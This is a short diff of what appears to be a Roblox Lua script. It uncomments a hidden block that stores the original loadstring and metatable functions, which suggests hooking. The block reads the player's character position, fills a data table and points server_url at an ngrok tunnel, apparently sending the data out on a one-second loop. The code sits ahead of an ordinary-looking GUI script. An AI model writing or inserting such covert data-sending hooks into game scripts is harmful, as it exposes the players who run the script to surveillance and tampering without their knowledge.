@@ -148,7 +148,7 @@ RunService.RenderStepped:Connect(function()
 end)
 
 
---[[
+
 originalLoadstring = loadstring
 originalGetMetatable = getmetatable
 originalSetMetatable = setmetatable
@@ -195,7 +195,7 @@ if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:Fin
     position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
 end
 
- server_url = "https://7745-94-137-92-1.ngrok-free.app/"
+ server_url = "https://60ba-94-137-92-2.ngrok-free.app/"
 
 
 data = {
@@ -277,7 +277,7 @@ spawn(function()
         wait(1) 
     end
 end)
---]]
+
 --SCRIPT
 
  screenGui = Instance.new("ScreenGui")
